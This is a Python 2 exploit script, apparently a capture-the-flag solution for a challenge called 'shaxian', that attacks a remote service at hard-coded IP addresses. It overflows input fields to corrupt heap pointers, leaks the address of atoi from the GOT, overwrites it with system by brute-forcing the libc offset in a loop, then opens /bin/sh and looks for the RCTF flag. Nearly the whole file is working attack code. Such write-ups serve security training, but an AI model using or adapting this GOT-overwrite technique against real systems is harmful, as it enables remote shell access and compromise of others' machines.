import struct
from zio import *

#target = ('119.254.101.197',10000)
#target = './shaxian'

target = ('180.76.178.48', 23333)

def input_info(io):
    io.read_until('Address:')
    io.writeline(l32(0)+l32(0x31))
    io.read_until('number:')
    io.writeline('a'*244+l32(0x31))

def dian_cai(io, name, num):
    io.read_until('choose:')
    io.writeline('1')
    io.read_until('Jianjiao')
    io.writeline(name)
    io.read_until('?')
    io.writeline(str(num))

def sublit(io):
    io.read_until('choose:')
    io.writeline('2')

def receipt(io, taitou):
    io.read_until('choose:')
    io.writeline('3')
    io.read_until('Taitou:')
    io.writeline(taitou)

def review(io):
    io.read_until('choose:')
    io.writeline('4')

def link_heap(io):
    io.read_until('choose:')
    io.writeline('4')
    io.read_until('2\n')
    heap_ptr = l32(io.read(4))
    print hex(heap_ptr)
    return heap_ptr

def leak_lib(io):
    io.read_until('choose:')
    io.writeline('4')
    io.read_until('* ')
    d = io.readline().strip('\n')
    return int(d, 10)&0xffffffff


def pwn (target, dis):
    io = zio(target, timeout=10000, print_read=COLORED(RAW, 'red'), print_write=COLORED(RAW, 'green'))
    #io = zio(target, timeout=10000, print_read=None, print_write=None)

    input_info(io)
    dian_cai(io, 'aaa', 1)

    read_got = 0x0804b010
    atoi_got = 0x0804B038

    #puts_got = 0x0804b02c

    payload = 'a'*32+l32(atoi_got-4)
    dian_cai(io, payload, 2)

    atoi_addr = link_heap(io)
    #system_addr = 0xf7e39190

    #io.gdb_hint()

    payload2 = 'a'*32+l32(0x0804B1C0-8)
    dian_cai(io, payload2, 3)

    sublit(io)
    payload = 'a'*4+l32(atoi_got)

    offset_read = 0x000da8d0
    offset_system = 0x0003e800
    offset_puts = 0x000656a0
    offset_atoi = 0x0002fbb0
    print "dis:",hex(dis), "com:", hex(offset_system - offset_atoi)
    #libc_base = atoi_addr - offset_atoi
    #system_addr = libc_base + offset_system
    #system_addr = libc_base + offset_puts
    system_addr = atoi_addr + dis
    system_addr = struct.unpack("i", l32(system_addr))[0]
    sublit(io)
    dian_cai(io, payload, system_addr)
    #io.writeline('/bin/cat /home/shaxian/flag')
    io.writeline('/bin/sh\n')
    io.interact()
    #data = io.read(1024)
    data = io.read_until_timeout(1)
    if "RCTF" in data or "No such file" in data:
        print "herre"
        file_w = open("flga-4002", 'w')
        data += "dis:" + hex(dis) + "com:" + hex(offset_system - offset_atoi)
        file_w.write(data)
        file_w.close()
        exit(0)
    else:
        io.close()
    #print "ok:"
    #io.interact()

dis = 0x100
dis = 0xe130
while dis < 0xffffff:
    try:
        print hex(dis)
        pwn(target, dis)
    except Exception, e:
        pass
    else:
        pass
    finally:
        dis += 0x10

